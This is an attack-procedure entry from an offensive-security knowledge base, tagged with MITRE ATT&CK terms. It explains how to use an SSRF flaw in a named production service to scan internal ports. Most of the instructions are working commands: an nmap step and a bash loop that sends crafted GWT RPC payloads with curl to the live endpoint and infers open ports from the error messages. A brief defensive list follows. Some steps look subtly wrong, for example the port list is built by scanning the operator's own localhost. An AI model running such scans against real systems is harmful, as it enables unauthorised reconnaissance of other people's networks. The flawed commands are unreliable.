---
id: proc-relateiq-port-scan-ssrf
tags:
  - ssrf
  - port-scanning
  - nmap-reference
type: procedure
tools:
  - '[[tools/nmap]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/gwt-rpc-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Active Scanning]]'
updated_at: '2025-12-14T17:28:20.607Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Vulnerability Scanning]]'
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Perform Port Scanning via SSRF

## Summary

This procedure uses the SSRF vulnerability to scan ports on target systems by modifying the custom URL in repeated GWT RPC requests, leveraging response differences to infer port status.

## Description

Once SSRF is confirmed, attackers can target localhost or external/internal IPs with common ports (e.g., top 50 from nmap). Open ports cause timeouts or connection errors (HTTP 504), while closed ports return direct failure messages. This enables blind port scanning from the RelateIQ server perspective, revealing internal network details.

## Requirements

1. Confirmed SSRF via prior test
2. List of target ports/IPs (use nmap for common ports)
3. Scripting capability for automation (e.g., bash loop with curl)

## Defense

Defensive measures and detection strategies:

- Block outbound connections from application servers to internal IPs
- Implement request rate limiting on validation endpoints
- Anomaly detection on connection logs for port probing patterns

## Objectives

1. Probe multiple ports on localhost/external systems
2. Differentiate open vs. closed ports via responses
3. Gather reconnaissance data for further exploits

## Instructions

### Step 1: Gather Target Ports

**Context**: Use nmap to reference common ports for scanning.

**Command** (nmap top ports):
```bash
nmap --top-ports 50 -oN ports.txt 127.0.0.1
```

> Extract ports like 80, 22, 443 for testing.

### Step 2: Iterate Scanning Requests

**Context**: Modify and send RPC payloads for each port.

**Command** ([[commands/gwt-rpc-ssrf-test]] with port variation):
```bash
# Loop example for ports
for port in $(cat ports.txt | grep '/' | cut -d'/' -f1); do
  payload="...|https://127.0.0.1:$port|..."
  curl -X POST https://app.relateiq.com/app/GWT.rpc -H "Content-Type: text/x-gwt-rpc; charset=utf-8" -d "$payload" | grep -i "504\|connect"
  if [[ $? -eq 0 ]]; then echo "Open: $port"; fi
 done
```

> Open ports show HTTP 504 or 'connection closed'; closed show 'Unable to connect'.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Active Scanning]] Active Scanning

### Sub-Techniques

- [[Vulnerability Scanning]] Scanning IP Blocks

## Commands Used

- [[commands/gwt-rpc-ssrf-test]]

## Tools Used

- [[tools/nmap]]

## Tags

- ssrf
- port-scanning
- reconnaissance
